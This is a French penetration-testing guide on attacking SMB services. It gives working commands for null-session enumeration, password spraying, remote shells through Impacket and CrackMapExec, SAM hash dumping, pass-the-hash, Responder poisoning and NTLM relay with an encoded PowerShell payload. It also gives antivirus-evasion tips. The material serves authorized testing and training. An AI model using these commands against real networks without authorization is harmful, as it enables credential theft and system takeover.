# Attaquer SMB

Server Message Block (SMB) est le protocole de partage de fichiers et d'imprimantes dans les environnements Windows, également supporté sous Linux via Samba. Sa surface d'attaque est large : énumération via sessions nulles, brute force, exécution de commandes à distance, capture de hash NTLM, et relais d'authentification. C'est l'un des protocoles les plus ciblés en test d'intrusion interne.

## Pourquoi

SMB est présent sur pratiquement toutes les machines Windows d'un réseau d'entreprise. Il tourne sur les ports TCP 139 (sur NetBIOS) et 445 (directement sur TCP/IP). Un accès SMB avec des privilèges suffisants ouvre la porte à l'exécution de commandes, l'extraction de hash, le mouvement latéral et l'escalade de privilèges. Même sans identifiants, les sessions nulles permettent souvent d'énumérer des utilisateurs, des partages et des politiques de sécurité.

## Comment ça marche

### Énumération

Le scan Nmap avec `-sC` sur les ports 139 et 445 révèle la version SMB, le hostname, le status de la signature des messages et parfois l'OS :

```bash
# - Scan des services SMB
nmap -sCV -p139,445 <IP_CIBLE>
```

### Sessions nulles et accès anonyme

Si le serveur SMB autorise les connexions sans authentification (null session), on peut lister les partages, les utilisateurs et les groupes.

**Lister les partages avec smbclient :**

```bash
# - Lister les partages sans identifiants
smbclient -N -L //<IP_CIBLE>
```

**Vérifier les permissions avec smbmap :**

```bash
# - Lister les partages et leurs permissions
smbmap -H <IP_CIBLE>

# - Parcourir un partage récursivement
smbmap -H <IP_CIBLE> -r <nom_partage>

# - Télécharger un fichier
smbmap -H <IP_CIBLE> --download "<partage>\chemin\fichier.txt"
```

**Énumérer via RPC avec rpcclient :**

```bash
# - Connexion RPC sans identifiants
rpcclient -U'%' <IP_CIBLE>

# Dans rpcclient :
# enumdomusers     - lister les utilisateurs du domaine
# enumdomgroups    - lister les groupes
# queryuser <RID>  - détails d'un utilisateur
# getdompwinfo     - politique de mots de passe
```

**Automatiser avec enum4linux-ng :**

```bash
# - Énumération automatisée
enum4linux-ng <IP_CIBLE> -A -C
```

{% hint style="info" %}
`enum4linux-ng` (la version Python) combine nmblookup, net, rpcclient et smbclient pour automatiser l'énumération : domaine, utilisateurs, OS, groupes, partages, politique de mots de passe.
{% endhint %}

### Brute force et password spray

Quand l'accès anonyme n'est pas disponible, CrackMapExec permet de tester des identifiants sur un ou plusieurs hôtes :

```bash
# - Password spray SMB
crackmapexec smb <IP_CIBLE> -u utilisateurs.txt -p 'MotDePasse123!' --local-auth
```

{% hint style="warning" %}
Par défaut, CrackMapExec s'arrête après le premier login valide trouvé. Ajouter `--continue-on-success` pour continuer le spray. Pour une machine hors domaine, ajouter `--local-auth`. Toujours vérifier la politique de verrouillage avant de lancer un spray.
{% endhint %}

### Exécution de commandes à distance

Avec un compte administrateur local, plusieurs méthodes permettent d'exécuter des commandes via SMB :

{% tabs %}
{% tab title="Impacket PsExec" %}
```bash
# - Shell interactif via PsExec
impacket-psexec administrateur:'MotDePasse'@<IP_CIBLE>
```

PsExec déploie un service temporaire sur le partage `ADMIN$`, utilise DCE/RPC pour démarrer ce service, et crée un named pipe pour l'interaction. On obtient un shell `NT AUTHORITY\SYSTEM`.
{% endtab %}
{% tab title="Impacket SMBExec" %}
```bash
# - Shell via SMBExec (pas besoin de partage inscriptible)
impacket-smbexec administrateur:'MotDePasse'@<IP_CIBLE>
```

Similaire à PsExec mais ne nécessite pas de déposer un binaire. Instancie un serveur SMB local pour recevoir la sortie des commandes.
{% endtab %}
{% tab title="CrackMapExec" %}
```bash
# - Exécuter une commande via CME
crackmapexec smb <IP_CIBLE> -u administrateur -p 'MotDePasse' \
    -x 'whoami' --exec-method smbexec

# - Exécuter du PowerShell
crackmapexec smb <IP_CIBLE> -u administrateur -p 'MotDePasse' \
    -X 'Get-Process'
```

L'avantage de CME : il peut cibler plusieurs machines simultanément en passant un range IP.
{% endtab %}
{% endtabs %}

### Extraction des hash SAM

La base SAM (Security Account Manager) stocke les hash NTLM des comptes locaux. Avec un accès administrateur :

```bash
# - Dumper les hash SAM via CrackMapExec
crackmapexec smb <IP_CIBLE> -u administrateur -p 'MotDePasse' --sam
```

Les hash obtenus sont au format `utilisateur:RID:LMhash:NThash:::`. Ils peuvent être crackés avec hashcat (mode 1000 pour NTLM) ou utilisés directement en Pass-the-Hash.

### Pass-the-Hash (PtH)

Si on dispose du hash NT d'un utilisateur sans connaître le mot de passe en clair, on peut s'authentifier directement avec le hash :

```bash
# - Authentification SMB avec un hash NT
crackmapexec smb <IP_CIBLE> -u administrateur -H <HASH_NT>

# - Shell interactif via PtH
impacket-psexec administrateur@<IP_CIBLE> -hashes :<HASH_NT>
```

### Capture de hash avec Responder

Responder empoisonne les requêtes LLMNR, NBT-NS et MDNS pour capturer les hash NetNTLMv2 des utilisateurs du réseau. Le principe : quand un poste Windows tente de résoudre un nom qui n'existe pas dans le DNS, il envoie une requête multicast. Responder répond à la place du serveur légitime et force le client à s'authentifier, ce qui expose son hash.

```bash
# - Lancer Responder en écoute
sudo responder -I <interface>
```

Les hash capturés sont stockés dans `/usr/share/responder/logs/` et peuvent être crackés avec hashcat :

```bash
# - Cracker un hash NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Relais NTLM

Si le hash ne se cracke pas, on peut le relayer vers une autre machine où le compte a des droits admin. Pour cela, désactiver SMB dans la configuration de Responder (`/etc/responder/Responder.conf`, mettre `SMB = Off`) puis utiliser ntlmrelayx :

```bash
# - Relayer les hash vers une cible
impacket-ntlmrelayx --no-http-server -smb2support -t <IP_CIBLE_RELAY>

# - Variante avec exécution de commande
impacket-ntlmrelayx --no-http-server -smb2support -t <IP_CIBLE_RELAY> \
    -c 'powershell -e <PAYLOAD_BASE64>'
```

Quand un utilisateur s'authentifie auprès de notre faux serveur, ntlmrelayx transmet l'authentification vers la cible et, en cas de succès, dumpe la SAM ou exécute la commande spécifiée.

{% hint style="danger" %}
Le relay NTLM ne fonctionne que si la signature SMB n'est pas requise sur la cible (`Message signing enabled but not required` dans le scan Nmap). Microsoft a corrigé la possibilité de relayer un hash vers la machine d'origine, mais le relay vers d'autres machines du réseau reste viable.
{% endhint %}

### Énumération des utilisateurs connectés

Avec des identifiants admin valides, CME peut lister les sessions ouvertes sur un réseau entier :

```bash
# - Lister les utilisateurs connectés sur un sous-réseau
crackmapexec smb <RESEAU>/24 -u administrateur -p 'MotDePasse' \
    --loggedon-users
```

Cela permet d'identifier rapidement où se trouvent les sessions d'administrateurs de domaine ou d'utilisateurs à haute valeur.

### SMBGhost (CVE-2020-0796)

SMBGhost est une vulnérabilité d'exécution de code à distance dans la compression SMBv3.1.1, affectant Windows 10 versions 1903 et 1909. Elle exploite un integer overflow dans le traitement des paquets compressés lors de la négociation de session. L'exploitation ne nécessite pas d'authentification et donne un accès `SYSTEM`.

La vulnérabilité est complexe à exploiter de manière fiable (manipulation du noyau, risque de crash), mais son impact est maximal. Vérifier la version de Windows et les correctifs appliqués avant toute tentative.

## En pratique

```bash
# 1 - Scan SMB
nmap -sCV -p139,445 <IP_CIBLE>

# 2 - Tester l'accès anonyme
smbclient -N -L //<IP_CIBLE>
smbmap -H <IP_CIBLE>

# 3 - Énumération automatisée
enum4linux-ng <IP_CIBLE> -A -C

# 4 - Password spray (attention au verrouillage)
crackmapexec smb <IP_CIBLE> -u utilisateurs.txt -p 'Saison2024!' --local-auth

# 5 - Si compte admin obtenu : exécuter des commandes
impacket-psexec admin:'MotDePasse'@<IP_CIBLE>

# 6 - Dumper la SAM
crackmapexec smb <IP_CIBLE> -u admin -p 'MotDePasse' --sam

# 7 - Écoute passive avec Responder
sudo responder -I tun0
```

## Pièges et galères

{% tabs %}
{% tab title="Sessions nulles" %}
- **Windows récent** : les versions récentes de Windows (Server 2016+, Windows 10+) restreignent fortement les sessions nulles. Ne pas conclure trop vite qu'il n'y a rien à énumérer, tester aussi avec un compte invité ou des identifiants bas niveau
- **Samba vs Windows** : les serveurs Samba exposent généralement plus d'informations en session nulle que les Windows récents
{% endtab %}
{% tab title="Responder" %}
- **Environnement de lab vs production** : Responder empoisonne activement le trafic réseau. En production, discuter avec le client avant de le lancer pour éviter des interruptions de service
- **Hash NetNTLMv2 vs NTLM** : les hash capturés par Responder sont des NetNTLMv2, pas des NTLM purs. Ils ne fonctionnent pas en PtH, ils doivent être crackés ou relayés
- **Plusieurs hash pour un compte** : NetNTLMv2 inclut un challenge aléatoire par session, donc les hash du même utilisateur diffèrent à chaque capture. C'est normal
{% endtab %}
{% tab title="PsExec" %}
- **Antivirus** : PsExec dépose un exécutable sur le partage ADMIN$, ce qui peut déclencher l'antivirus. SMBExec est plus discret car il n'écrit pas de binaire
- **ADMIN$ inaccessible** : si le partage ADMIN$ est restreint, essayer avec C$ ou un autre partage inscriptible, ou utiliser atexec (qui passe par le Task Scheduler)
{% endtab %}
{% endtabs %}

## Retour terrain

SMB est probablement le service le plus attaqué en pentest interne. Les sessions nulles sont rares sur les Windows récents, mais les serveurs Samba et les machines legacy les autorisent encore souvent. Le password spray via CrackMapExec avec des patterns saisonniers (`Saison2024!`, `NomEntreprise01!`) donne régulièrement des résultats.

Responder est un outil passif extrêmement efficace : le lancer en début de pentest interne et le laisser tourner pendant qu'on travaille sur d'autres vecteurs. Les hash capturés se crackent souvent en quelques minutes avec hashcat et rockyou.

Pour l'exécution de commandes, impacket-psexec reste la méthode la plus fiable, mais si l'AV le bloque, passer à smbexec ou atexec. CrackMapExec est l'outil polyvalent par excellence pour le mouvement latéral SMB.

## Mémo express

| Technique | Outil / Commande | Prérequis |
|---|---|---|
| Null session | `smbclient -N`, `smbmap`, `rpcclient -U'%'` | Accès anonyme autorisé |
| Énumération auto | `enum4linux-ng -A -C` | Réseau accessible |
| Password spray | `crackmapexec smb -u fichier -p pass` | Liste d'utilisateurs |
| RCE | `impacket-psexec`, `smbexec`, `atexec` | Compte admin local |
| SAM dump | `crackmapexec --sam` | Compte admin local |
| Pass-the-Hash | `crackmapexec -H`, `psexec -hashes` | Hash NT d'un admin |
| Hash capture | `responder -I <iface>` | Positionnement réseau |
| Relay NTLM | `impacket-ntlmrelayx -t <cible>` | Signature SMB non requise |
| SMBGhost | CVE-2020-0796 | Win10 1903/1909 non patché |

***
